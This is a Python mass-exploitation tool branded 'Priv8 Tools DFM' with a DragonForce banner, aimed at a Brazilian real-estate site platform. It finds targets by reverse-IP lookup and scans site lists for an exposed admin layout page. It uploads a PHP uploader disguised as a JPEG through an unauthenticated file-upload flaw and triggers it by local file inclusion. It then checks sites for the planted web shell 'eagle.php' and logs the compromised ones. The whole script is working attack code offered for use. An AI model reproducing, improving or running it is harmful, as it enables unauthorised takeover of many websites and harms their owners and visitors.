import cloudscraper, sys, os, colorama, time, ctypes, datetime, sys, platform
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime

today = date.today()
d2 = today.strftime("%B %d, %Y")

if platform.system()=='Linux':
    os.system('clear')
    sys.stdout.write("\x1b]2;Priv8 Tools DFM\x07")
else:
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'Priv8 Tools DFM | {d2}')



print(f"""{Style.BRIGHT + Fore.RED}
 ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
 ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
 ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
 ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                             
{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
{Style.BRIGHT + Fore.YELLOW}  
                            Priv8 PoC LocasiteBrazil CSRF File Upload + LocalFileInclusion
                                   Func reverse ip lookup scan exploitable server
                                            https://dragonforce.io
                                            Telegram: dragonforceio
                                Get Started With (pip install -r requirements.txt)                                                 

{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
""")

def helpdesk():
    print(Style.BRIGHT+"\t\t\tUsage (reverse ip lookup): python exp.py l target.com")
    print(Style.BRIGHT+"\t\t\tUsage (Check Exploitable): python exp.py e dfm_sitelist.txt")
    print(Style.BRIGHT+"\t\t\tUsage (Run Exploit): python exp.py x vulnsite.txt")
    print(Style.BRIGHT+"\t\t\tUsage (Exploit single site): python exp.py s https://target.com/")
    print(Style.BRIGHT+"\t\t\tUsage (Uploaded Shell): python exp.py c vulnsite.txt")

def checkWeb(web):
    urlArr = urlparse(web)
    if(urlArr.scheme=="https"):
        return web.replace("https://","")
    elif(urlArr.scheme=="http"):
        return web.replace("http://","")
    else:
        return web.replace("/","")


def reverse_ip(target):
    url = checkWeb(target)
    api = "https://api.hackertarget.com/reverseiplookup/?q="
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    res = scraper.get(api+target)
    if(res.status_code==200 and res.text=='error check your search parameter'):
        print(Style.BRIGHT+"\t\t\t\terror check your search parameter")
        sys.exit(0)
        os._exit(0)
    else:
        i = 0
        dfmfile = open('dfm_'+target+'.txt','w')
        for line in res.text:
            dfmfile.write(line)
        dfmfile.close()
        count = open('dfm_'+target+'.txt','r')
        c = count.readlines()
        for no in c:
            i += 1
        print(Fore.BLUE+"\t\t\t\t\t\tTotal site found: {}".format(i))

def arglength():
    if(len(sys.argv)>3 or len(sys.argv)<=1):
        return False
    else:
        return True

def position(arr,types):
    if(types=="l" or types=="e" or types=="x" or types=="c" or types=="s"):
        return arr.index(types) + 1
    else:
        print(Style.BRIGHT+"\t\t\t\t\tCommand not found!")
        helpdesk()
        sys.exit(0)
        os._exit(0)

def splitter(text):
    temp = open('temp.txt','w')
    temp.write(text)
    get = open('temp.txt','r')
    lines = get.readlines()
    for line in lines:
        if '654' in line:
            first = line.split('<a href="')
            second = first[1].split('">')
            third = second[0]
            break;
    return third

def getnumber(url):
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    mydir = "estrutura/img_imoveis/"
    checkpath = scraper.get(url+mydir,timeout=5)
    print(Style.BRIGHT+Fore.YELLOW+"Retrieving id...")
    if checkpath.status_code==200:
        first = checkpath.text.split('Parent Directory')
        second = first[1].split('<a href="')
        third = second[1].split('/">')
        return third[0]
    else:
        exnum = input('Cant detect number, please insert for me : ')
        return exnum

def checkShelled(wordlist):
    nord = "estrutura/admin/"
    shellFile = "eagle.php"
    shelled = []
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    f = open(wordlist,'r')
    lines = f.readlines()
    for line in lines:
        try:
            shelled1 = scraper.get("https://"+line.replace("\n","")+"/"+shellFile,timeout=5)
            if shelled1.status_code>=200 and "Uploader" in shelled1.text:
                print("https://"+line.replace("\n","")+"/"+shellFile)
                shelled.append("https://"+line.replace("\n","")+"/"+shellFile)
            else:
                shelled2 = scraper.get("https://"+line.replace("\n","")+"/"+nord+shellFile,timeout=5)
                if shelled2.status_code>=200 and "Uploader" in shelled2.text:
                    print("https://"+line.replace("\n","")+"/"+nord+shellFile)
                    shelled.append("https://"+line.replace("\n","")+"/"+nord+shellFile)
        except:
            print(Style.BRIGHT+Fore.RED+"[+]Error while connecting site -> {}".format(line.replace("\n",""))+Style.BRIGHT+Fore.BLUE)

    c = open('shelled.txt','a')
    for sh in shelled:
        c.write(sh+"\n")
    c.close()
    print(Fore.BLUE+"\nShelled site saved in shelled.txt"+Style.BRIGHT+Fore.WHITE)

def single(site):
    #noid = getnumber(site)
    cpf = "estrutura/admin/layout.php"
    mydir = "estrutura/imagens/background/"
    nord = "estrutura/admin/"
    nordpath = "../imagens/background/"
    shellFile = "eagle.php";
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    try:
        uploader = scraper.get(site+cpf,timeout=5)
        if uploader.status_code==200 or uploader.status_code==302:
            headers = {"User-agent":"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"}
            data = {'nova_imagem_fundo':'meow'}
            payload = {'arquivo': ('uploader.jpg', open("shell/uploader.txt","rb"),'image/jpeg')}
            rekt = scraper.post(site+cpf,data=data,files=payload,headers=headers)
            check_path = scraper.get(site+mydir,timeout=5)
            if check_path.status_code==200:
                print(Style.BRIGHT+Fore.BLUE+"Check image for site -> {}".format(site)+"/"+mydir)
                md5_image = splitter(check_path.text)
                upfile = scraper.get(site+"/index.php?pg="+mydir+md5_image,timeout=5)
                myShell = scraper.get(site+shellFile,timeout=5)
                if upfile.status_code==200 and (myShell.status_code==200 and "Uploader" in myShell.text):
                    print(Style.BRIGHT+Fore.GREEN+"Shell for {} successfully uploaded!".format(site+shellFile)+Style.BRIGHT+Fore.BLUE)
                else:
                    print("Bypassing redirect admin...")
                    noRedirect = scraper.get(site+nord+"index.php?pg="+nordpath+md5_image,timeout=5)
                    noRedirectShell = scraper.get(site+nord+shellFile,timeout=5)
                    if upfile.status_code==200 and (noRedirect.status_code!=200 or "Uploader" in noRedirectShell.text):
                        print(Style.BRIGHT+Fore.GREEN+"Shell {} successfully uploaded!".format(site+nord+shellFile)+Style.BRIGHT+Fore.BLUE)
                    else:
                        print(Style.BRIGHT+Fore.YELLOW+"{} are not vulnerable for lfi!".format(site+"/"+nord+"index.php?pg="+nordpath+md5_image))
            else:
                print(Style.BRIGHT+Fore.RED+"Path inaccessible -> {}".format(site)+Style.BRIGHT+Fore.BLUE)
        else:
            print(Style.BRIGHT+Fore.RED+"Not vulnerable -> {}".format(site)+Style.BRIGHT+Fore.BLUE)
            print(uploader.status_code)
    except:
        print(Style.BRIGHT+Fore.RED+"Error while connecting site -> {}".format(site)+Style.BRIGHT+Fore.BLUE)

def exploiter(wordlist):
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)   
    try:
        f = open(wordlist,'r')
        lines = f.readlines()
        for line in lines:
            target = 'http://'+line.replace('\n','')+'/'
            try:
                single(target)
            except:
                print(Style.BRIGHT+Fore.RED+"Error while connecting site -> {}".format(line.replace("\n",""))+Style.BRIGHT+Fore.BLUE)
        print(Style.BRIGHT+Fore.WHITE+"\nChecking Uploaded Shell\n")
        checkShelled(wordlist)
    except:
        print("File not found!")


def expPath(wordlist):
    exp = "estrutura/admin/layout.php"
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    try:
        f = open(wordlist,'r')
        lines = f.readlines()
        vulnsite = []
        for line in lines:
            try:
                gotcha = scraper.get("http://"+line.replace("\n","")+"/"+exp,timeout=5)
                if(gotcha.status_code==200 or gotcha.status_code==302):
                    print(Style.BRIGHT+Fore.WHITE+"\t\t\t-------------------------------------------------------------")
                    print(Fore.BLUE+"\t\t\tSite may vulnerable for CSRF upload!-> {}".format(line))
                    vulnsite.append(line)
                else:
                    print(Fore.RED+"\t\t\tSeems not exploitable -> {}".format(line))
            except:
                print(Fore.YELLOW+"\t\t\tNo connection -> {} ".format(line))
        save = open('vulnsite.txt','a')
        for vuln in vulnsite:
            save.write(vuln)
        save.close()
        if os.path.isfile('vulnsite.txt'):
            print(Fore.GREEN+"\n\nAll Exploitable site saved in vulnsite.txt")
    except FileNotFoundError:
        print(Fore.RED+"\t\t\t\t\tFile could not be loaded!")

if(arglength()==False):
    helpdesk()
else:
    try:
        target = position(sys.argv,sys.argv[1])
        if(sys.argv[1]=="l"):
            reverse_ip(sys.argv[target])
        elif(sys.argv[1]=="x"):
            exploiter(sys.argv[target])
        elif(sys.argv[1]=="c"):
            checkShelled(sys.argv[target])
        elif(sys.argv[1]=="s"):
            single(sys.argv[target])
        else:
            expPath(sys.argv[target])

    except KeyboardInterrupt:
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
